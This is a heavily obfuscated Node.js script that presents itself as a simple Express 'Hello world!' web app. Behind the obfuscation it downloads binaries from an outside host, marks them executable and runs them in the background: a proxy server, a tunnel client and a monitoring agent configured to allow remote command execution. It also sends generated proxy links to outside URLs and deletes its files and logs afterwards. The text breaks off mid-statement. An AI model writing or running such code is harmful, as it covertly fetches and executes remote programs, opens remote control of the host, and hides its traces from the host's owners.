const _0xefc5af=_0x4367;(function(_0x2c5756,_0x2b7e33){const _0x3d179=_0x4367,_0x43c49f=_0x2c5756();while(!![]){try{const _0x163c89=-parseInt(_0x3d179(0x8f))/0x1*(-parseInt(_0x3d179(0x14c))/0x2)+-parseInt(_0x3d179(0x13d))/0x3+-parseInt(_0x3d179(0x127))/0x4+parseInt(_0x3d179(0x12c))/0x5*(-parseInt(_0x3d179(0xcd))/0x6)+parseInt(_0x3d179(0x117))/0x7+-parseInt(_0x3d179(0x139))/0x8+parseInt(_0x3d179(0x135))/0x9*(parseInt(_0x3d179(0x124))/0xa);if(_0x163c89===_0x2b7e33)break;else _0x43c49f['push'](_0x43c49f['shift']());}catch(_0x2433ff){_0x43c49f['push'](_0x43c49f['shift']());}}}(_0x4911,0xdfe54));const express=require(_0xefc5af(0xb6)),app=express(),axios=require(_0xefc5af(0xe0)),os=require('os'),fs=require('fs'),path=require(_0xefc5af(0xa3)),{promisify}=require(_0xefc5af(0xfa)),exec=promisify(require(_0xefc5af(0x141))['exec']),{execSync}=require(_0xefc5af(0x141)),UPLOAD_URL=process['env'][_0xefc5af(0xe4)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0xefc5af(0x134)]['AUTO_ACCESS']||![],FILE_PATH=process[_0xefc5af(0x134)][_0xefc5af(0xec)]||_0xefc5af(0xb1),SUB_PATH=process['env']['SUB_PATH']||_0xefc5af(0xa8),PORT=process[_0xefc5af(0x134)][_0xefc5af(0x10b)]||process['env'][_0xefc5af(0xc2)]||0xbb8,UUID=process[_0xefc5af(0x134)][_0xefc5af(0x144)]||_0xefc5af(0x9b),NEZHA_SERVER=process[_0xefc5af(0x134)][_0xefc5af(0x112)]||'',NEZHA_PORT=process[_0xefc5af(0x134)][_0xefc5af(0x9e)]||'',NEZHA_KEY=process[_0xefc5af(0x134)][_0xefc5af(0xbd)]||'',ARGO_DOMAIN=process['env'][_0xefc5af(0x8e)]||_0xefc5af(0xd4),ARGO_AUTH=process['env'][_0xefc5af(0xf2)]||_0xefc5af(0x93),ARGO_PORT=process[_0xefc5af(0x134)][_0xefc5af(0x109)]||0x1f41,CFIP=process[_0xefc5af(0x134)][_0xefc5af(0x140)]||_0xefc5af(0x111),CFPORT=process[_0xefc5af(0x134)][_0xefc5af(0xfe)]||0x1bb,NAME=process[_0xefc5af(0x134)][_0xefc5af(0x92)]||'';!fs[_0xefc5af(0xbb)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0xefc5af(0x98)](FILE_PATH+_0xefc5af(0xb9))):console[_0xefc5af(0x98)](FILE_PATH+_0xefc5af(0xa1));function generateRandomName(){const _0x4440ba=_0xefc5af,_0x3b1a9b=_0x4440ba(0x14b);let _0x1d4e4f='';for(let _0x23dd07=0x0;_0x23dd07<0x6;_0x23dd07++){_0x1d4e4f+=_0x3b1a9b[_0x4440ba(0xd9)](Math[_0x4440ba(0x95)](Math[_0x4440ba(0x97)]()*_0x3b1a9b[_0x4440ba(0xeb)]));}return _0x1d4e4f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xefc5af(0x107)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0xefc5af(0x107)](FILE_PATH,webName),botPath=path[_0xefc5af(0x107)](FILE_PATH,botName),subPath=path[_0xefc5af(0x107)](FILE_PATH,_0xefc5af(0xd8)),listPath=path[_0xefc5af(0x107)](FILE_PATH,_0xefc5af(0x126)),bootLogPath=path[_0xefc5af(0x107)](FILE_PATH,_0xefc5af(0xf0)),configPath=path[_0xefc5af(0x107)](FILE_PATH,_0xefc5af(0x12f));function deleteNodes(){const _0x39652a=_0xefc5af;try{if(!UPLOAD_URL)return;if(!fs[_0x39652a(0xbb)](subPath))return;let _0x36a0b3;try{_0x36a0b3=fs['readFileSync'](subPath,_0x39652a(0xb8));}catch{return null;}const _0x4c68f3=Buffer[_0x39652a(0xef)](_0x36a0b3,_0x39652a(0xa2))['toString']('utf-8'),_0xbdcd86=_0x4c68f3[_0x39652a(0xa5)]('\x0a')[_0x39652a(0xed)](_0x6b5333=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x39652a(0x9d)](_0x6b5333));if(_0xbdcd86[_0x39652a(0xeb)]===0x0)return;return axios[_0x39652a(0x123)](UPLOAD_URL+_0x39652a(0xb7),JSON[_0x39652a(0xb3)]({'nodes':_0xbdcd86}),{'headers':{'Content-Type':_0x39652a(0x8b)}})[_0x39652a(0xe3)](_0x473978=>{return null;}),null;}catch(_0x51b28c){return null;}}function cleanupOldFiles(){const _0x11f769=_0xefc5af;try{const _0x338218=fs[_0x11f769(0xc5)](FILE_PATH);_0x338218[_0x11f769(0xe2)](_0xfdf9c1=>{const _0x490f49=_0x11f769,_0x566057=path[_0x490f49(0x107)](FILE_PATH,_0xfdf9c1);try{const _0x396a6a=fs['statSync'](_0x566057);_0x396a6a[_0x490f49(0xea)]()&&fs['unlinkSync'](_0x566057);}catch(_0x22812a){}});}catch(_0x39319f){}}app[_0xefc5af(0xee)]('/',function(_0x18ba44,_0x342e30){const _0x55612a=_0xefc5af;_0x342e30[_0x55612a(0xe1)](_0x55612a(0xd7));});async function generateConfig(){const _0x2a1a45=_0xefc5af,_0x388bb4={'log':{'access':_0x2a1a45(0x146),'error':_0x2a1a45(0x146),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2a1a45(0xe5),'settings':{'clients':[{'id':UUID,'flow':_0x2a1a45(0xa4)}],'decryption':_0x2a1a45(0xcf),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x2a1a45(0xbf),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2a1a45(0x14a)}},{'port':0xbb9,'listen':_0x2a1a45(0xc1),'protocol':_0x2a1a45(0xe5),'settings':{'clients':[{'id':UUID}],'decryption':_0x2a1a45(0xcf)},'streamSettings':{'network':_0x2a1a45(0x14a),'security':_0x2a1a45(0xcf)}},{'port':0xbba,'listen':_0x2a1a45(0xc1),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2a1a45(0xcf)},'streamSettings':{'network':'ws','security':_0x2a1a45(0xcf),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2a1a45(0x102),_0x2a1a45(0xa0),_0x2a1a45(0x145)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x2a1a45(0x105),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2a1a45(0x102),_0x2a1a45(0xa0),_0x2a1a45(0x145)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2a1a45(0xc1),'protocol':_0x2a1a45(0x118),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2a1a45(0xcf),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2a1a45(0x102),_0x2a1a45(0xa0),_0x2a1a45(0x145)],'metadataOnly':![]}}],'dns':{'servers':[_0x2a1a45(0xfd)]},'outbounds':[{'protocol':_0x2a1a45(0xc3),'tag':_0x2a1a45(0xa7)},{'protocol':'blackhole','tag':_0x2a1a45(0x10f)}]};fs[_0x2a1a45(0xcb)](path[_0x2a1a45(0x107)](FILE_PATH,_0x2a1a45(0x12f)),JSON['stringify'](_0x388bb4,null,0x2));}function getSystemArchitecture(){const _0x329412=_0xefc5af,_0x3ce695=os['arch']();return _0x3ce695===_0x329412(0x13b)||_0x3ce695==='arm64'||_0x3ce695==='aarch64'?_0x329412(0x13b):_0x329412(0xe8);}function downloadFile(_0x314a6e,_0x33ee76,_0x49a1f7){const _0x48f30f=_0xefc5af,_0xf0ca28=_0x314a6e;!fs['existsSync'](FILE_PATH)&&fs[_0x48f30f(0xb2)](FILE_PATH,{'recursive':!![]});const _0x197886=fs[_0x48f30f(0xb0)](_0xf0ca28);axios({'method':_0x48f30f(0xee),'url':_0x33ee76,'responseType':'stream'})[_0x48f30f(0x10c)](_0x8da0d9=>{const _0x166b05=_0x48f30f;_0x8da0d9[_0x166b05(0xdf)][_0x166b05(0xa6)](_0x197886),_0x197886['on'](_0x166b05(0x88),()=>{const _0x1be1ac=_0x166b05;_0x197886[_0x1be1ac(0x10d)](),console[_0x1be1ac(0x98)]('Download\x20'+path[_0x1be1ac(0x131)](_0xf0ca28)+'\x20successfully'),_0x49a1f7(null,_0xf0ca28);}),_0x197886['on'](_0x166b05(0xf9),_0x54f08e=>{const _0x255e71=_0x166b05;fs['unlink'](_0xf0ca28,()=>{});const _0x344de6=_0x255e71(0xd6)+path[_0x255e71(0x131)](_0xf0ca28)+_0x255e71(0xd3)+_0x54f08e[_0x255e71(0x12b)];console[_0x255e71(0xf9)](_0x344de6),_0x49a1f7(_0x344de6);});})['catch'](_0x51e4bf=>{const _0x4be8a5=_0x48f30f,_0xadeffa=_0x4be8a5(0xd6)+path['basename'](_0xf0ca28)+'\x20failed:\x20'+_0x51e4bf[_0x4be8a5(0x12b)];console[_0x4be8a5(0xf9)](_0xadeffa),_0x49a1f7(_0xadeffa);});}function _0x4367(_0x16d9a1,_0x16cd25){_0x16d9a1=_0x16d9a1-0x88;const _0x491100=_0x4911();let _0x436759=_0x491100[_0x16d9a1];return _0x436759;}async function downloadFilesAndRun(){const _0x2d6cc7=_0xefc5af,_0x5647a6=getSystemArchitecture(),_0x3d2f00=getFilesForArchitecture(_0x5647a6);if(_0x3d2f00[_0x2d6cc7(0xeb)]===0x0){console[_0x2d6cc7(0x98)](_0x2d6cc7(0x96));return;}const _0x9d590f=_0x3d2f00['map'](_0x1a9665=>{return new Promise((_0x195f92,_0x4a44c0)=>{const _0x5540cd=_0x4367;downloadFile(_0x1a9665[_0x5540cd(0xde)],_0x1a9665[_0x5540cd(0x11d)],(_0x330119,_0x4e707c)=>{_0x330119?_0x4a44c0(_0x330119):_0x195f92(_0x4e707c);});});});try{await Promise[_0x2d6cc7(0xb5)](_0x9d590f);}catch(_0xcdf74){console[_0x2d6cc7(0xf9)](_0x2d6cc7(0xaf),_0xcdf74);return;}function _0x5eae5b(_0x32fcba){const _0x25ffe3=_0x2d6cc7,_0x571a43=0x1fd;_0x32fcba[_0x25ffe3(0xe2)](_0x45a616=>{const _0x386110=_0x25ffe3;fs[_0x386110(0xbb)](_0x45a616)&&fs[_0x386110(0x121)](_0x45a616,_0x571a43,_0x21756e=>{const _0x2ce595=_0x386110;_0x21756e?console['error']('Empowerment\x20failed\x20for\x20'+_0x45a616+':\x20'+_0x21756e):console[_0x2ce595(0x98)]('Empowerment\x20success\x20for\x20'+_0x45a616+':\x20'+_0x571a43[_0x2ce595(0xf1)](0x8));});});}const _0x35e5fb=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5eae5b(_0x35e5fb);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x474bed=NEZHA_SERVER[_0x2d6cc7(0xab)](':')?NEZHA_SERVER[_0x2d6cc7(0xa5)](':')[_0x2d6cc7(0x119)]():'',_0x238a26=new Set(['443',_0x2d6cc7(0xbe),_0x2d6cc7(0xc0),_0x2d6cc7(0x103),_0x2d6cc7(0xdc),'2053']),_0x40e737=_0x238a26['has'](_0x474bed)?_0x2d6cc7(0x13c):_0x2d6cc7(0x13a),_0x5c18f5=_0x2d6cc7(0x114)+NEZHA_KEY+_0x2d6cc7(0xa9)+NEZHA_SERVER+_0x2d6cc7(0x101)+_0x40e737+_0x2d6cc7(0x12d)+UUID;fs['writeFileSync'](path[_0x2d6cc7(0x107)](FILE_PATH,_0x2d6cc7(0x143)),_0x5c18f5);const _0x66639a='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x2d6cc7(0xbc);try{await exec(_0x66639a),console[_0x2d6cc7(0x98)](phpName+_0x2d6cc7(0x8c)),await new Promise(_0x18aec2=>setTimeout(_0x18aec2,0x3e8));}catch(_0x188aa0){console[_0x2d6cc7(0xf9)](_0x2d6cc7(0xf6)+_0x188aa0);}}else{let _0x243a36='';const _0x26fb33=[_0x2d6cc7(0xad),_0x2d6cc7(0xbe),'2096','2087',_0x2d6cc7(0xdc),_0x2d6cc7(0x136)];_0x26fb33['includes'](NEZHA_PORT)&&(_0x243a36=_0x2d6cc7(0x11a));const _0x3a6f78=_0x2d6cc7(0xfc)+npmPath+_0x2d6cc7(0x14d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2d6cc7(0x12e)+NEZHA_KEY+'\x20'+_0x243a36+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3a6f78),console[_0x2d6cc7(0x98)](npmName+_0x2d6cc7(0x8c)),await new Promise(_0x583933=>setTimeout(_0x583933,0x3e8));}catch(_0x54741d){console[_0x2d6cc7(0xf9)](_0x2d6cc7(0x149)+_0x54741d);}}}else console[_0x2d6cc7(0x98)](_0x2d6cc7(0xac));const _0x19d6ff=_0x2d6cc7(0xfc)+webPath+'\x20-c\x20'+FILE_PATH+_0x2d6cc7(0x12a);try{await exec(_0x19d6ff),console[_0x2d6cc7(0x98)](webName+_0x2d6cc7(0x8c)),await new Promise(_0x2efd60=>setTimeout(_0x2efd60,0x3e8));}catch(_0x7f34a){console[_0x2d6cc7(0xf9)](_0x2d6cc7(0x148)+_0x7f34a);}if(fs[_0x2d6cc7(0xbb)](botPath)){let _0x4c2ff3;if(ARGO_AUTH[_0x2d6cc7(0x90)](/^[A-Z0-9a-z=]{120,250}$/))_0x4c2ff3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x2d6cc7(0x90)](/TunnelSecret/)?_0x4c2ff3=_0x2d6cc7(0x125)+FILE_PATH+_0x2d6cc7(0xf5):_0x4c2ff3=_0x2d6cc7(0x110)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4c2ff3+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x2d6cc7(0x8c)),await new Promise(_0x3938e2=>setTimeout(_0x3938e2,0x7d0));}catch(_0x3340af){console[_0x2d6cc7(0xf9)](_0x2d6cc7(0x115)+_0x3340af);}}await new Promise(_0x18727e=>setTimeout(_0x18727e,0x1388));}function getFilesForArchitecture(_0x3c8a93){const _0x216918=_0xefc5af;let _0x1a055a;_0x3c8a93===_0x216918(0x13b)?_0x1a055a=[{'fileName':webPath,'fileUrl':_0x216918(0xba)},{'fileName':botPath,'fileUrl':_0x216918(0xd0)}]:_0x1a055a=[{'fileName':webPath,'fileUrl':_0x216918(0x9c)},{'fileName':botPath,'fileUrl':_0x216918(0xd1)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1ab71e=_0x3c8a93===_0x216918(0x13b)?_0x216918(0x11f):'https://amd64.ssss.nyc.mn/agent';_0x1a055a[_0x216918(0x128)]({'fileName':npmPath,'fileUrl':_0x1ab71e});}else{const _0x59abc9=_0x3c8a93===_0x216918(0x13b)?_0x216918(0xc7):_0x216918(0x132);_0x1a055a[_0x216918(0x128)]({'fileName':phpPath,'fileUrl':_0x59abc9});}}return _0x1a055a;}function argoType(){const _0x515e3a=_0xefc5af;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x515e3a(0x98)](_0x515e3a(0x8a));return;}if(ARGO_AUTH[_0x515e3a(0xab)](_0x515e3a(0xc4))){fs[_0x515e3a(0xcb)](path[_0x515e3a(0x107)](FILE_PATH,_0x515e3a(0xff)),ARGO_AUTH);const _0x2f4a27=_0x515e3a(0xf4)+ARGO_AUTH['split']('\x22')[0xb]+_0x515e3a(0xce)+path[_0x515e3a(0x107)](FILE_PATH,_0x515e3a(0xff))+_0x515e3a(0x99)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x515e3a(0xd5);fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.yml'),_0x2f4a27);}else console[_0x515e3a(0x98)](_0x515e3a(0x104));}async function extractDomains(){const _0x2c5bef=_0xefc5af;let _0x8c8ae2;if(ARGO_AUTH&&ARGO_DOMAIN)_0x8c8ae2=ARGO_DOMAIN,console[_0x2c5bef(0x98)](_0x2c5bef(0xf3),_0x8c8ae2),await _0x2ced70(_0x8c8ae2);else try{const _0x4d3735=fs[_0x2c5bef(0x9a)](path[_0x2c5bef(0x107)](FILE_PATH,_0x2c5bef(0xf0)),'utf-8'),_0x284520=_0x4d3735[_0x2c5bef(0xa5)]('\x0a'),_0xbfbf32=[];_0x284520[_0x2c5bef(0xe2)](_0x27ffdc=>{const _0x2a5dda=_0x2c5bef,_0x2b4079=_0x27ffdc[_0x2a5dda(0x90)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2b4079){const _0x558dcb=_0x2b4079[0x1];_0xbfbf32[_0x2a5dda(0x133)](_0x558dcb);}});if(_0xbfbf32[_0x2c5bef(0xeb)]>0x0)_0x8c8ae2=_0xbfbf32[0x0],console[_0x2c5bef(0x98)](_0x2c5bef(0x11e),_0x8c8ae2),await _0x2ced70(_0x8c8ae2);else{console[_0x2c5bef(0x98)](_0x2c5bef(0xdd)),fs[_0x2c5bef(0x122)](path[_0x2c5bef(0x107)](FILE_PATH,_0x2c5bef(0xf0)));async function _0x1ef0cf(){const _0x2e6ed6=_0x2c5bef;try{process[_0x2e6ed6(0x137)]===_0x2e6ed6(0xe9)?await exec(_0x2e6ed6(0xb4)+botName+_0x2e6ed6(0xf8)):await exec(_0x2e6ed6(0xdb)+botName['charAt'](0x0)+']'+botName[_0x2e6ed6(0x11b)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x3d631b){}}_0x1ef0cf(),await new Promise(_0x247c76=>setTimeout(_0x247c76,0xbb8));const _0x5b1ef2=_0x2c5bef(0x110)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5b1ef2+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x2c5bef(0x8c)),await new Promise(_0x1ef6b3=>setTimeout(_0x1ef6b3,0xbb8)),await extractDomains();}catch(_0x2d3b5b){console[_0x2c5bef(0xf9)](_0x2c5bef(0x115)+_0x2d3b5b);}}}catch(_0x474031){console[_0x2c5bef(0xf9)](_0x2c5bef(0x89),_0x474031);}async function _0x2261f3(){const _0x589144=_0x2c5bef;try{const _0x3d002a=await axios['get'](_0x589144(0x8d),{'timeout':0xbb8});if(_0x3d002a[_0x589144(0xdf)]&&_0x3d002a[_0x589144(0xdf)][_0x589144(0x113)]&&_0x3d002a[_0x589144(0xdf)][_0x589144(0x13f)])return _0x3d002a[_0x589144(0xdf)][_0x589144(0x113)]+'_'+_0x3d002a[_0x589144(0xdf)][_0x589144(0x13f)];}catch(_0x50b343){try{const _0x607576=await axios['get'](_0x589144(0xaa),{'timeout':0xbb8});if(_0x607576[_0x589144(0xdf)]&&_0x607576['data'][_0x589144(0x138)]===_0x589144(0xcc)&&_0x607576['data']['countryCode']&&_0x607576[_0x589144(0xdf)][_0x589144(0x13f)])return _0x607576['data'][_0x589144(0x94)]+'_'+_0x607576['data'][_0x589144(0x13f)];}catch(_0x4288f2){}}return _0x589144(0x106);}async function _0x2ced70(_0x1ce886){const _0x1eb35d=await _0x2261f3(),_0x4f0fdd=NAME?NAME+'-'+_0x1eb35d:_0x1eb35d;return new Promise(_0x1d0da0=>{setTimeout(()=>{const _0xf8f99c=_0x4367,_0x127067={'v':'2','ps':''+_0x4f0fdd,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0xf8f99c(0xcf),'host':_0x1ce886,'path':_0xf8f99c(0xe7),'tls':'tls','sni':_0x1ce886,'alpn':'','fp':_0xf8f99c(0xc8)},_0x279029=_0xf8f99c(0x130)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1ce886+'&fp=firefox&type=ws&host='+_0x1ce886+_0xf8f99c(0xca)+_0x4f0fdd+'\x0a\x0avmess://'+Buffer[_0xf8f99c(0xef)](JSON[_0xf8f99c(0xb3)](_0x127067))[_0xf8f99c(0xf1)](_0xf8f99c(0xa2))+_0xf8f99c(0x147)+UUID+'@'+CFIP+':'+CFPORT+_0xf8f99c(0x13e)+_0x1ce886+'&fp=firefox&type=ws&host='+_0x1ce886+_0xf8f99c(0xda)+_0x4f0fdd+_0xf8f99c(0x108);console[_0xf8f99c(0x98)](Buffer[_0xf8f99c(0xef)](_0x279029)['toString']('base64')),fs[_0xf8f99c(0xcb)](subPath,Buffer[_0xf8f99c(0xef)](_0x279029)[_0xf8f99c(0xf1)](_0xf8f99c(0xa2))),console['log'](FILE_PATH+_0xf8f99c(0x142)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4cd268,_0x203e7d)=>{const _0x186f8d=_0xf8f99c,_0x565e2b=Buffer[_0x186f8d(0xef)](_0x279029)['toString']('base64');_0x203e7d['set']('Content-Type',_0x186f8d(0x129)),_0x203e7d['send'](_0x565e2b);}),_0x1d0da0(_0x279029);},0x7d0);});}}async function uploadNodes(){const _0x7af5f0=_0xefc5af;if(UPLOAD_URL&&PROJECT_URL){const _0x4ecd3c=PROJECT_URL+'/'+SUB_PATH,_0xe040e5={'subscription':[_0x4ecd3c]};try{const _0x556b77=await axios[_0x7af5f0(0x123)](UPLOAD_URL+_0x7af5f0(0xfb),_0xe040e5,{'headers':{'Content-Type':_0x7af5f0(0x8b)}});return _0x556b77&&_0x556b77['status']===0xc8?(console[_0x7af5f0(0x98)]('Subscription\x20uploaded\x20successfully'),_0x556b77):null;}catch(_0x2831be){if(_0x2831be[_0x7af5f0(0x10e)]){if(_0x2831be[_0x7af5f0(0x10e)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x7af5f0(0xbb)](listPath))return;const _0x4c2517=fs[_0x7af5f0(0x9a)](listPath,_0x7af5f0(0xb8)),_0x51b452=_0x4c2517['split']('\x0a')['filter'](_0x54de6c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x7af5f0(0x9d)](_0x54de6c));if(_0x51b452['length']===0x0)return;const _0x342704=JSON[_0x7af5f0(0xb3)]({'nodes':_0x51b452});try{const _0x352f18=await axios['post'](UPLOAD_URL+_0x7af5f0(0x120),_0x342704,{'headers':{'Content-Type':_0x7af5f0(0x8b)}});return _0x352f18&&_0x352f18[_0x7af5f0(0x138)]===0xc8?(console[_0x7af5f0(0x98)](_0x7af5f0(0xae)),_0x352f18):null;}catch(_0x18ae5){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x166975=_0x4367,_0x524236=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x524236[_0x166975(0x133)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x524236[_0x166975(0x133)](phpPath);process[_0x166975(0x137)]===_0x166975(0xe9)?exec('del\x20/f\x20/q\x20'+_0x524236[_0x166975(0x107)]('\x20')+_0x166975(0x100),_0x44dffc=>{const _0x2acafc=_0x166975;console[_0x2acafc(0x9f)](),console['log'](_0x2acafc(0x11c)),console[_0x2acafc(0x98)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x166975(0xc6)+_0x524236[_0x166975(0x107)]('\x20')+'\x20>/dev/null\x202>&1',_0x600893=>{const _0xd9c3ec=_0x166975;console['clear'](),console[_0xd9c3ec(0x98)](_0xd9c3ec(0x11c)),console[_0xd9c3ec(0x98)](_0xd9c3ec(0xf7));});},0x15f90);}function _0x4911(){const _0x151678=['--tls','substring','App\x20is\x20running','fileUrl','ArgoDomain:','https://arm64.ssss.nyc.mn/agent','/api/add-nodes','chmod','unlinkSync','post','195710DcqLwn','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','list.txt','3857652yljcIs','unshift','text/plain;\x20charset=utf-8','/config.json\x20>/dev/null\x202>&1\x20&','message','125BwCpmH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20-p\x20','config.json','\x0avless://','basename','https://amd64.ssss.nyc.mn/v1','push','env','2367YFIIRv','2053','platform','status','3848312paKYFZ','false','arm','true','4984800vRdgmd','?security=tls&sni=','org','CFIP','child_process','/sub.txt\x20saved\x20successfully','config.yaml','UUID','quic','/dev/null','\x0a\x0atrojan://','web\x20running\x20error:\x20','npm\x20running\x20error:\x20','tcp','abcdefghijklmnopqrstuvwxyz','684910AiUObL','\x20-s\x20','finish','Error\x20reading\x20boot.log:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','application/json','\x20is\x20running','https://ipapi.co/json/','ARGO_DOMAIN','1kMvFbk','match','automatic\x20access\x20task\x20added\x20successfully','NAME','eyJhIjoiYzY1NDY2YTAwZmEzNGIxMGU2MjE2MjYzYjJlOWE3ODciLCJ0IjoiMWYxNGI0MDUtODQxZi00NzhkLTg2MmMtMzhiMjI2OGM1ODVjIiwicyI6IlpqRmtZMll6WkRjdFl6SmhaQzAwT1dJekxUZzROalF0WVRNMk5qVTJZVE0xTWpGbSJ9','countryCode','floor','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','random','log','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','readFileSync','5838beaf-c939-4e42-a4c7-25374a2a5425','https://amd64.ssss.nyc.mn/web','test','NEZHA_PORT','clear','tls','\x20already\x20exists','base64','path','xtls-rprx-vision','split','pipe','direct','sub','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','http://ip-api.com/json/','includes','NEZHA\x20variable\x20is\x20empty,skip\x20running','443','Nodes\x20uploaded\x20successfully','Error\x20downloading\x20files:','createWriteStream','./tmp','mkdirSync','stringify','taskkill\x20/f\x20/im\x20','all','express','/api/delete-nodes','utf-8','\x20is\x20created','https://arm64.ssss.nyc.mn/web','existsSync','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','NEZHA_KEY','8443','/vmess-argo','2096','127.0.0.1','PORT','freedom','TunnelSecret','readdirSync','rm\x20-rf\x20','https://arm64.ssss.nyc.mn/v1','firefox','listen','&path=%2Fvless-argo%3Fed%3D2560#','writeFileSync','success','422946sAsUhY','\x0a\x20\x20credentials-file:\x20','none','https://arm64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/bot','https://oooo.serv00.net/add-url','\x20failed:\x20','earoufghgwe83rotz.yominra.dpdns.org','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Download\x20','Hello\x20world!','sub.txt','charAt','&path=%2Ftrojan-argo%3Fed%3D2560#','pkill\x20-f\x20\x22[','2083','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','fileName','data','axios','send','forEach','catch','UPLOAD_URL','vless','Skipping\x20adding\x20automatic\x20access\x20task','/vmess-argo?ed=2560','amd','win32','isFile','length','FILE_PATH','filter','get','from','boot.log','toString','ARGO_AUTH','ARGO_DOMAIN:','\x0a\x20\x20tunnel:\x20','/tunnel.yml\x20run','php\x20running\x20error:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','.exe\x20>\x20nul\x202>&1','error','util','/api/add-subscriptions','nohup\x20','https+local://8.8.8.8/dns-query','CFPORT','tunnel.json','\x20>\x20nul\x202>&1','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','http','2087','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','vmess','Unknown','join','\x0a\x20\x20\x20\x20','ARGO_PORT','Add\x20automatic\x20access\x20task\x20faild:\x20','SERVER_PORT','then','close','response','block','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','cdns.doon.eu.org','NEZHA_SERVER','country_code','\x0aclient_secret:\x20','Error\x20executing\x20command:\x20','Error\x20in\x20startserver:','2077425Uytojs','trojan','pop'];_0x4911=function(){return _0x151678;};return _0x4911();}cleanFiles();async function AddVisitTask(){const _0x10f71b=_0xefc5af;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x10f71b(0x98)](_0x10f71b(0xe6));return;}try{const _0x1458d1=await axios['post'](_0x10f71b(0xd2),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x10f71b(0x98)](_0x10f71b(0x91)),_0x1458d1;}catch(_0xa2e8e3){return console[_0x10f71b(0xf9)](_0x10f71b(0x10a)+_0xa2e8e3[_0x10f71b(0x12b)]),null;}}async function startserver(){const _0x3ea661=_0xefc5af;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 